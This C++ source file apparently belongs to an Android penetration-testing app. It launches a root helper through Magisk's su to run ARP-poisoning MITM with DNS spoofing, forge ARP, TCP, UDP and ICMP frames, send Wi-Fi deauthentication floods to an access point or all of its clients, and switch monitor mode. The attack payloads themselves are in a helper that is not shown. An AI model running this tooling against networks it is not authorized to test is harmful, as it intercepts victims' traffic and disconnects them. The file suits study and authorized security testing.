// App-side bridge to the privileged helper (`zsraw`).
//
// The helper is a separate executable built from zs_helper.cpp and installed
// into the APK's nativeLibraryDir. This file locates it, drives it through
// Magisk's `su`, and turns its line-delimited JSON into engine events.
//
// Magisk specifics
//   * `su` is injected into the app's PATH by Magisk's daemon; the canonical
//     binary lives at /debug_ramdisk/su (Android 11+ with the magisk-boot
//     layout) and is bind-mounted onto /system/bin/su. Checking /data/adb/magisk
//     is the reliable way to tell Magisk apart from SuperSU/APatch/Kitsune.
//   * Magisk grants a shell in the `u:r:magisk:s0` domain, which permits
//     AF_PACKET and AF_INET SOCK_RAW. That is why the helper must be a *new*
//     root process rather than code running inside the app process.
#include "zs.h"

#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cerrno>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <sstream>

namespace zs {
namespace {

// ------------------------------------------------------------- process state
// The MITM / deauth helpers are long-running loops terminated by SIGTERM, so
// their pids have to outlive the Job that started them.
struct HelperProc {
  pid_t pid = -1;
  std::string tag;
};
std::vector<HelperProc> g_running;
std::mutex g_procMtx;

// ------------------------------------------------------------------- paths
// Java unpacks the helper from assets into filesDir (AGP cannot package an
// add_executable() target, and with extractNativeLibs=false there is no lib/
// directory on disk to exec from) and hands us the absolute path. The
// /proc/self/maps lookup below is only a fallback.
std::string g_helperOverride;
bool g_helperResolved = false;

std::string helperPath() {
  static std::string cached;
  std::lock_guard<std::mutex> lk(g_procMtx);
  if (g_helperResolved) return g_helperOverride;
  if (!g_helperOverride.empty()) {
    g_helperResolved = true;
    return g_helperOverride;
  }

  std::ifstream maps("/proc/self/maps");
  std::string line, dir;
  while (std::getline(maps, line)) {
    if (line.find("libzerosploit.so") == std::string::npos) continue;
    size_t sp = line.find('/');
    if (sp == std::string::npos) continue;
    std::string path = line.substr(sp);
    size_t slash = path.rfind('/');
    if (slash == std::string::npos) continue;
    dir = path.substr(0, slash);
    break;
  }
  if (dir.empty()) {
    // Fall back to the link that Android guarantees for the loaded library.
    char buf[4096];
    ssize_t n = readlink("/proc/self/exe", buf, sizeof buf - 1);
    if (n > 0) {
      buf[n] = 0;
      std::string p(buf);
      size_t slash = p.rfind('/');
      if (slash != std::string::npos) dir = p.substr(0, slash);
    }
  }
  if (!dir.empty()) {
    std::string cand = dir + "/zsraw";
    if (access(cand.c_str(), X_OK) == 0) cached = cand;
  }
  g_helperOverride = cached;
  g_helperResolved = true;
  return cached;
}

}  // namespace

void setHelperPath(const std::string& path) {
  std::lock_guard<std::mutex> lk(g_procMtx);
  g_helperOverride = path;
  g_helperResolved = true;
}

namespace {



std::string whichSu() {
  static const char* kPaths[] = {"/system/bin/su",  "/system/xbin/su",
                                 "/sbin/su",        "/su/bin/su",
                                 "/debug_ramdisk/su", "/system/sbin/su",
                                 "/vendor/bin/su"};
  for (const char* p : kPaths)
    if (access(p, X_OK) == 0) return p;
  return "";
}

bool magiskPresent() { return access("/data/adb/magisk", F_OK) == 0; }

// Build a single shell command string for `su -c`, quoting every argument.
std::string shellQuote(const std::string& s) {
  std::string o = "'";
  for (char c : s) {
    if (c == '\'') o += "'\\''";
    else o += c;
  }
  o += "'";
  return o;
}

bool rootGranted() {
  std::string su = whichSu();
  if (su.empty()) return false;
  std::string out = execRoot("id -u", 4000);
  return trim(out) == "0";
}

// Gate message used everywhere a root feature is requested without root.
void requireRoot(Job& j, const char* feature) {
  std::string su = whichSu();
  j.log("error", "root", std::string(feature) + " needs root");
  if (su.empty())
    j.log("error", "root",
          "no su binary found — this device appears to be unrooted");
  else if (!rootGranted())
    j.log("error", "root", "su found at " + su +
                            " but the request was not granted (denied or no "
                            "prompt shown)");
  if (magiskPresent())
    j.log("info", "root", "Magisk detected at /data/adb/magisk");
}

void requireHelper(Job& j, const char* feature) {
  std::string h = helperPath();
  if (h.empty()) {
    j.log("error", "helper",
          std::string(feature) + ": privileged helper zsraw is not installed");
  }
}

// ------------------------------------------------------------- event pump
// Runs `su -c "<helper> <args...>"`, forwarding every stdout line as a raw
// event. stderr is captured and emitted as a log line so failures are visible
// instead of silent.
void runHelper(Job& j, const std::string& args, bool streaming,
               const std::string& tag) {
  std::string su = whichSu();
  if (su.empty()) {
    j.log("error", "root", "no su binary — is this device rooted?");
    return;
  }
  std::string helper = helperPath();
  if (helper.empty()) {
    j.log("error", "helper",
          "privileged helper zsraw is not installed (reinstall the APK)");
    return;
  }
  std::string cmd = helper + " " + args;
  j.log("info", "su", (streaming ? "launch" : "run") + std::string(" via ") + su +
                          " -c " + shellQuote(cmd));

  int outPipe[2], errPipe[2];
  if (pipe(outPipe) != 0) { j.log("error", "su", "pipe failed"); return; }
  if (pipe(errPipe) != 0) {
    ::close(outPipe[0]); ::close(outPipe[1]);
    j.log("error", "su", "pipe failed");
    return;
  }

  pid_t pid = fork();
  if (pid < 0) {
    ::close(outPipe[0]); ::close(outPipe[1]);
    ::close(errPipe[0]); ::close(errPipe[1]);
    j.log("error", "su", std::string("fork failed: ") + strerror(errno));
    return;
  }
  if (pid == 0) {
    // Child: wire up the pipes and hand over to Magisk's su.
    ::close(outPipe[0]);
    ::close(errPipe[0]);
    dup2(outPipe[1], STDOUT_FILENO);
    dup2(errPipe[1], STDERR_FILENO);
    ::close(outPipe[1]);
    ::close(errPipe[1]);
    int devnull = ::open("/dev/null", O_RDONLY);
    if (devnull >= 0) { dup2(devnull, STDIN_FILENO); ::close(devnull); }
    setpgid(0, 0);   // isolate from the app's process group
    execl(su.c_str(), su.c_str(), "-c", cmd.c_str(), (char*)nullptr);
    _exit(127);
  }

  ::close(outPipe[1]);
  ::close(errPipe[1]);
  {
    std::lock_guard<std::mutex> lk(g_procMtx);
    g_running.push_back({pid, tag});
  }

  // stdout: one JSON object per line
  std::string pending;
  char buf[4096];
  bool eof = false;
  // Cancellation bookkeeping. The stop flag is polled every pass, not only on
  // a timeout: a streaming helper never times out, because MITM writes a line
  // per observed flow and the forger reports progress. Checking isStop() only
  // inside the `pr == 0` branch meant that a busy run never saw the flag, so
  // pressing stop left the helper alive and the victim's ARP cache poisoned
  // after the UI said it had stopped.
  bool signalled = false;
  bool hardKilled = false;
  long long termAt = 0;
  // Long enough for the helper to notice the flag, leave its loop and put the
  // real gateway entry back -- its observation pass is bounded by four 60 ms
  // reads plus one interval, so ~1.3 s in the default configuration.
  const long long kTermGraceMs = 4000;
  while (!eof) {
    if (j.isStop() && !signalled) {
      signalled = true;
      termAt = nowMs();
      // The helper sets pgid == pid, so this reaches it and anything it
      // started. SIGTERM rather than SIGKILL on purpose: the helper catches it,
      // exits its loop and repairs the ARP entries, and that repair is the
      // difference between a stopped run and a victim left pointed at this
      // phone.
      kill(-pid, SIGTERM);
    }
    if (signalled && !hardKilled && nowMs() - termAt > kTermGraceMs) {
      hardKilled = true;
      j.log("warn", tag,
            "helper did not exit within " + std::to_string(kTermGraceMs / 1000) +
                "s of SIGTERM; killing the process group. Any ARP repair it "
                "had not finished may not have happened.");
      kill(-pid, SIGKILL);
    }
    struct pollfd p{outPipe[0], POLLIN, 0};
    int pr = poll(&p, 1, 100);
    if (pr < 0) {
      if (errno == EINTR) continue;
      break;
    }
    if (pr == 0) continue;
    ssize_t n = read(outPipe[0], buf, sizeof buf);
    if (n <= 0) { eof = true; break; }
    pending.append(buf, n);
    size_t nl;
    while ((nl = pending.find('\n')) != std::string::npos) {
      std::string line = trim(pending.substr(0, nl));
      pending.erase(0, nl + 1);
      if (line.empty()) continue;
      j.emit("raw", line);
    }
  }
  if (!trim(pending).empty()) j.emit("raw", trim(pending));
  ::close(outPipe[0]);

  // stderr
  std::string ebuf;
  while (true) {
    struct pollfd p{errPipe[0], POLLIN, 0};
    if (poll(&p, 1, 50) <= 0) break;
    ssize_t n = read(errPipe[0], buf, sizeof buf);
    if (n <= 0) break;
    ebuf.append(buf, n);
  }
  ::close(errPipe[0]);
  for (auto& l : split(ebuf, '\n')) {
    std::string t = trim(l);
    if (!t.empty()) j.log("warn", "su", t);
  }

  // Reap unconditionally. Skipping this for one-shot queries left a zombie
  // behind for every forge/arp/monitor call.
  int status = 0;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  {
    std::lock_guard<std::mutex> lk(g_procMtx);
    for (size_t i = 0; i < g_running.size(); i++) {
      if (g_running[i].pid == pid) { g_running.erase(g_running.begin() + i); break; }
    }
  }
}

// Blocking variant for one-shot queries.
std::string runHelperCapture(const std::string& args, int timeoutMs) {
  std::string su = whichSu();
  if (su.empty()) return "";
  std::string helper = helperPath();
  if (helper.empty()) return "";
  std::string cmd = helper + " " + args;
  int pipefd[2];
  if (pipe(pipefd) != 0) return "";
  pid_t pid = fork();
  if (pid < 0) { ::close(pipefd[0]); ::close(pipefd[1]); return ""; }
  if (pid == 0) {
    ::close(pipefd[0]);
    dup2(pipefd[1], STDOUT_FILENO);
    int devnull = ::open("/dev/null", O_RDWR);
    if (devnull >= 0) { dup2(devnull, STDERR_FILENO); ::close(devnull); }
    setpgid(0, 0);
    execl(su.c_str(), su.c_str(), "-c", cmd.c_str(), (char*)nullptr);
    _exit(127);
  }
  ::close(pipefd[1]);
  std::string out;
  char buf[4096];
  long long deadline = nowMs() + timeoutMs;
  while (nowMs() < deadline) {
    struct pollfd p{pipefd[0], POLLIN, 0};
    if (poll(&p, 1, 200) <= 0) continue;
    ssize_t n = read(pipefd[0], buf, sizeof buf);
    if (n <= 0) break;
    out.append(buf, n);
  }
  ::close(pipefd[0]);
  // Only signal if it is still alive: after waitpid reports the child as
  // finished its pid may already belong to an unrelated process, and
  // kill(-pid) would hit that process group.
  if (waitpid(pid, nullptr, WNOHANG) == 0) {
    kill(-pid, SIGKILL);
    int st = 0;
    while (waitpid(pid, &st, 0) < 0 && errno == EINTR) {
    }
  }
  return out;
}

}  // namespace

// ---------------------------------------------------------------- lifecycle
namespace {

// SIGTERM, then wait, then SIGKILL if it is still there. The grace period is
// generous because the helper has to finish repairing the victim's ARP
// entries on the way out, and a SIGKILL part-way through that leaves the
// gateway entry pointing at this phone with nothing left to fix it.
void stopHelperProc(pid_t pid, Job* j, const std::string& tag) {
  if (pid <= 0) return;
  kill(-pid, SIGTERM);
  bool gone = false;
  for (int i = 0; i < 200; i++) {           // up to 5s
    if (waitpid(pid, nullptr, WNOHANG) == pid) { gone = true; break; }
    usleep(25000);
  }
  if (gone) return;
  if (j) {
    j->log("warn", tag,
           "helper ignored SIGTERM; sending SIGKILL. An ARP repair that had "
           "not finished will not have been applied.");
  }
  kill(-pid, SIGKILL);
  int st = 0;
  while (waitpid(pid, &st, 0) < 0 && errno == EINTR) {
  }
}

// Stop only the helpers launched with this tag. Stopping MITM used to call
// shutdownHelpers(), which signalled every tracked helper: stopping an ARP
// poison on one interface also tore down an unrelated frame forge, a monitor
// mode switch or a running deauth, none of which the user asked to touch.
void stopHelpersByTag(Job& j, const std::string& tag) {
  std::vector<pid_t> pids;
  {
    std::lock_guard<std::mutex> lk(g_procMtx);
    for (auto& h : g_running)
      if (h.tag == tag) pids.push_back(h.pid);
  }
  if (pids.empty()) {
    j.log("info", tag, "nothing running to stop");
    return;
  }
  j.log("info", tag,
        "stopping " + std::to_string(pids.size()) + " running " + tag +
            " helper(s)");
  for (pid_t p : pids) stopHelperProc(p, &j, tag);
}

}  // namespace

// Terminate anything still running; called from the JNI shutdown hook and
// when the service is destroyed so no helper outlives the app. Every helper
// is signalled the same way, SIGTERM first, so a streaming helper still gets
// to undo what it did.
void shutdownHelpers() {
  std::vector<pid_t> pids;
  {
    std::lock_guard<std::mutex> lk(g_procMtx);
    for (auto& h : g_running) pids.push_back(h.pid);
    g_running.clear();
  }
  for (pid_t p : pids) stopHelperProc(p, nullptr, "shutdown");
}

// -------------------------------------------------------------------- caps
RawCaps probeRawCaps(const std::string& iface) {
  RawCaps c;
  c.iface = iface;
  c.detail = "";
  // Without root these are all unavailable by definition; report the reason
  // instead of an empty object so the UI can explain itself.
  if (!rootGranted()) {
    c.detail = whichSu().empty()
                   ? "device is not rooted (no su binary found)"
                   : "root not granted to this app";
    return c;
  }
  std::string out = runHelperCapture("caps " + shellQuote(iface), 6000);
  if (out.empty()) {
    c.detail = "privileged helper produced no output";
    return c;
  }
  // The helper answers with one or more JSON lines; take the caps line.
  for (auto& line : split(out, '\n')) {
    std::string t = trim(line);
    if (t.find("\"type\":\"caps\"") == std::string::npos) continue;
    c.packetSocket = contains(t, "\"packetSocket\":true");
    c.rawIpSocket = contains(t, "\"rawIpSocket\":true");
    c.monitorMode = contains(t, "\"monitorMode\":true");
    c.detail = "reported by zsraw under uid 0";
    break;
  }
  if (c.detail.empty()) c.detail = "unexpected helper response";
  return c;
}

// -------------------------------------------------------------------- MITM
void opMitmStart(Job& j, const std::string& iface, const std::string& targetsCsv,
                 int intervalMs, const std::string& spoofName,
                 const std::string& spoofIp) {
  if (!rootGranted()) { requireRoot(j, "ARP spoofing / MITM"); return; }
  requireHelper(j, "MITM");
  // Half a spoof config would poison the gateway and then answer nothing, which
  // leaves the target with no working DNS at all. Refuse instead.
  if (spoofName.empty() != spoofIp.empty()) {
    j.log("error", "dns", "spoofing needs both a name and an address");
    j.progress("mitm", 1.0, "spoofing needs both a name and an address");
    return;
  }
  if (!spoofName.empty()) {
    // Validate before poisoning. A typo in the address would otherwise poison
    // the gateway and then be unable to answer anything, which leaves the
    // target with no working DNS and shows up only as a run that counts zero --
    // the failure is indistinguishable from "nothing asked for that name".
    struct in_addr probe;
    if (inet_pton(AF_INET, spoofIp.c_str(), &probe) != 1) {
      j.log("error", "dns", "'" + spoofIp + "' is not an IPv4 address");
      j.progress("mitm", 1.0, "spoofing needs an IPv4 address");
      return;
    }
    // An empty label is a typo ("intranet..acme") rather than a name anyone
    // resolves, and the helper's exact-match comparison would simply never fire.
    if (spoofName.find("..") != std::string::npos
        || spoofName.front() == '.' || spoofName.back() == '.') {
      j.log("error", "dns", "'" + spoofName + "' is not a usable name");
      j.progress("mitm", 1.0, "spoofing needs a usable name");
      return;
    }
  }
  j.progress("mitm", 0.0, iface);
  std::string cmd = "mitm " + shellQuote(iface) + " " + shellQuote(targetsCsv) +
                    " " + std::to_string(intervalMs);
  if (!spoofName.empty()) {
    cmd += " " + shellQuote(spoofName) + " " + shellQuote(spoofIp);
  }
  runHelper(j, cmd, true, "mitm");
  j.progress("mitm", 1.0, "stopped");
}

void opMitmStop(Job& j) {
  // Only the MITM helper, not every helper the app happens to have running.
  stopHelpersByTag(j, "mitm");
  j.progress("mitm", 1.0, "stopped");
}

// -------------------------------------------------------------------- forge
// specCsv is "type,srcIp,dstIp,sport,dport,count,pps,payload[,bssid][,destMac]"
void opForge(Job& j, const std::string& specCsv) {
  if (!rootGranted()) { requireRoot(j, "packet forging"); return; }
  requireHelper(j, "Packet forger");

  auto f = split(specCsv, ',');
  auto at = [&](size_t i) -> std::string { return i < f.size() ? trim(f[i]) : ""; };
  int type = atoi(at(0).c_str());
  const char* kind = "icmp";
  switch (type) {
    case 0: kind = "tcp"; break;
    case 1: kind = "udp"; break;
    case 2: kind = "icmp"; break;
    case 3: kind = "arp"; break;
    case 4: kind = "deauth"; break;
    default: kind = "icmp"; break;
  }
  std::string iface = primaryIface().name;
  std::string bssid = at(8), dstMac = at(9);
  int count = atoi(at(5).c_str());
  int pps = atoi(at(6).c_str());
  std::string payload = at(7);
  std::string kv;
  if (type == 3) {
    kv = "targetIp=" + at(1) + ",targetMac=" + (dstMac.empty() ? std::string("ff:ff:ff:ff:ff:ff") : dstMac) +
         ",op=2,count=" + std::to_string(count ? count : 1) +
         ",pps=" + std::to_string(pps ? pps : 1);
  } else if (type == 4) {
    kv = "bssid=" + bssid + ",dest=" + (dstMac.empty() ? std::string("ff:ff:ff:ff:ff:ff") : dstMac) +
         ",reason=7,count=" + std::to_string(count ? count : 1) +
         ",pps=" + std::to_string(pps ? pps : 1);
  } else {
    kv = "srcIp=" + at(1) + ",dstIp=" + at(2) + ",sport=" + at(3) +
         ",dport=" + at(4) + ",count=" + std::to_string(count ? count : 1) +
         ",pps=" + std::to_string(pps ? pps : 1);
    if (!dstMac.empty()) kv += ",dstMac=" + dstMac;
    if (!payload.empty()) kv += ",payload=" + payload;
    if (type == 0) kv += ",seq=1000,flags=2";
    if (type == 2) kv += ",icmpType=8,icmpCode=0";
  }
  j.log("info", "forge", std::string("frame kind = ") + kind);
  j.progress("forge", 0.0, kind);
  runHelper(j, "forge " + shellQuote(iface) + " " + shellQuote(kind) + " " +
                   shellQuote(kv),
            false, "forge");
  j.progress("forge", 1.0, "done");
}

// --------------------------------------------------------------- wifi scan
// Native code cannot enumerate access points: that lives behind the Android
// WifiManager framework API and needs the ACCESS_FINE_LOCATION permission.
// The Java layer drives WifiManager and feeds results into the UI, so this
// operation only reports where the data comes from.
void opWifiScan(Job& j, const std::string& iface) {
  j.log("info", "wifi", "scan enumeration runs through the Android "
                       "WifiManager API, not the native layer");
  j.log("info", "wifi", "interface under test: " + iface);
  j.log("warn", "wifi", "requesting scan from the platform requires "
                        "ACCESS_FINE_LOCATION and a scan-throttle window");
  j.emit("wifiScan", "{\"type\":\"delegated\",\"iface\":" + jstr(iface) +
                         ",\"source\":\"android.net.wifi.WifiManager\"}");
  j.progress("wifi", 1.0, "delegated to framework");
}

// ------------------------------------------------------------------ deauth
// `bssid` is the AP to attack on a monitor-mode interface, the station MAC to
// drop from a soft AP, or "all" to sweep every station the phone's own hotspot
// has associated. `count` > 0 sends a finite burst; 0 keeps sending until the
// job is cancelled, which is what the run/stop toggle runs.
//
// `clientMac` picks out one station of that access point. It changes the blast
// radius, so the log line below names the scope rather than just the AP: an
// operator reading the log afterwards has to be able to tell a single client
// from a whole network.
void opDeauth(Job& j, const std::string& iface, const std::string& bssid,
              int intervalMs, int count, const std::string& clientMac, int freqMhz) {
  if (!rootGranted()) { requireRoot(j, "deauthentication"); return; }
  requireHelper(j, "Wi-Fi deauth");
  std::string ifn = iface.empty() ? primaryIface().name : iface;
  bool every = bssid.empty() || bssid == "all" || bssid == "*";
  std::string one = trim(clientMac);
  if (one.empty())
    j.log("warn", "wifi", every
                         ? "deauth will forcibly disconnect every client of " + ifn
                         : "deauth will forcibly disconnect clients from " + bssid);
  else
    j.log("warn", "wifi", "deauth will forcibly disconnect only " + one +
                             " from " + bssid);
  j.progress("deauth", 0.0, every ? "all" : bssid);
  // Both the burst and the continuous case go through the helper's deauth
  // command: on a soft AP it is hostapd that has to send the frame, and
  // injection through the forge path cannot work there at all.
  //
  // The frequency is passed last and only when known. The helper tunes the
  // radio to it before the first frame; without it the frames leave the device
  // on whatever channel the radio was already sitting on, which succeeds
  // silently and reaches nobody.
  //
  // The clientMac slot is always written, even when no station was picked, as
  // an explicit empty quoted argument. The helper reads these positionally
  // (ifn target intervalMs reason count clientMac freqMhz), so appending the
  // frequency while clientMac was omitted slid the frequency into the clientMac
  // slot: a broadcast sweep on a known channel stopped being a sweep, tried to
  // resolve "2437" as a MAC and failed with BAD_STATION.
  runHelper(j,
            "deauth " + shellQuote(ifn) + " " + shellQuote(every ? "all" : bssid) +
                " " + std::to_string(intervalMs) + " 7 " + std::to_string(count) +
                " " + shellQuote(one) +
                (freqMhz > 0 ? " " + std::to_string(freqMhz) : ""),
            count <= 0, "deauth");
  j.progress("deauth", 1.0, "done");
}

// --------------------------------------------------------------- station list
// The stations the deauth module can name a target in. Two sources, and which
// one is used follows from the interface rather than from a mode switch: a soft
// AP answers from hostapd's association table, while a station interface has to
// listen in monitor mode and attribute frames to the picked BSSID. Both arrive
// as one `staList` event so the UI renders them through the same list.
void opStaList(Job& j, const std::string& iface, const std::string& bssid,
               int freqMhz, int listenMs) {
  if (!rootGranted()) { requireRoot(j, "listing Wi-Fi clients"); return; }
  requireHelper(j, "Client list");
  std::string ifn = iface.empty() ? primaryIface().name : iface;
  j.progress("sta", 0.0, ifn);
  // The capture window has to fit inside the helper's lifetime, with room to
  // spare for the process itself: at the old fixed 8s a 10s listen would have
  // been cut off mid-capture and reported as an empty list.
  int listen = listenMs > 0 ? listenMs : 6000;
  std::string out = runHelperCapture(
      "sta " + shellQuote(ifn) +
          (bssid.empty() ? "" : " " + shellQuote(trim(bssid))) +
          " " + std::to_string(listen) +
          (freqMhz > 0 ? " " + std::to_string(freqMhz) : ""),
      listen + 6000);
  std::string line;
  for (auto& l : split(out, '\n')) {
    std::string t = trim(l);
    if (t.find("\"type\":\"staList\"") != std::string::npos) { line = t; break; }
  }
  if (line.empty()) {
    // The helper reports its own failures as {"type":"error"...}; forward one so
    // the UI can explain itself rather than showing an empty list.
    for (auto& l : split(out, '\n')) {
      std::string t = trim(l);
      if (t.find("\"type\":\"error\"") != std::string::npos) { line = t; break; }
    }
  }
  if (line.empty()) {
    j.log("error", "wifi", "the helper returned no client list for " + ifn);
    j.emit("staList", "{\"type\":\"staList\",\"iface\":" + jstr(ifn) +
                          ",\"apMode\":false,\"source\":\"none\",\"count\":0,"
                          "\"clients\":[],\"msg\":\"no response from zsraw\"}");
  } else {
    j.emit("staList", line);
  }
  j.progress("sta", 1.0, "done");
}

// Turn the wifi radio off or back on. Bigger than kicking clients: the whole
// soft AP goes down, so nothing can reassociate until it is switched back on.
void opRadio(Job& j, bool on) {
  if (!rootGranted()) {
    requireRoot(j, on ? "turning wifi back on" : "turning wifi off");
    return;
  }
  requireHelper(j, "Wifi power");
  j.progress("radio", 0.0, on ? "enabling wifi" : "stopping wifi");
  // One-shot: the helper answers with a single radioResult line and exits, so
  // the UI is not left with a run button that never finishes.
  runHelper(j, std::string("radio ") + (on ? "1" : "0"), false, "radio");
  j.progress("radio", 1.0, on ? "wifi on" : "wifi off");
}

// Switch a wifi interface into or out of monitor mode.
void opMonitorMode(Job& j, const std::string& iface, bool on) {
  if (!rootGranted()) { requireRoot(j, "monitor mode"); return; }
  requireHelper(j, "Monitor mode");
  runHelper(j, "monitor " + shellQuote(iface) + " " + (on ? "1" : "0"), false,
            "monitor");
}

// Report what Magisk exposes; used by the capability screen.
std::string opMagiskInfo() {
  return runHelperCapture("magisk", 6000);
}

}  // namespace zs
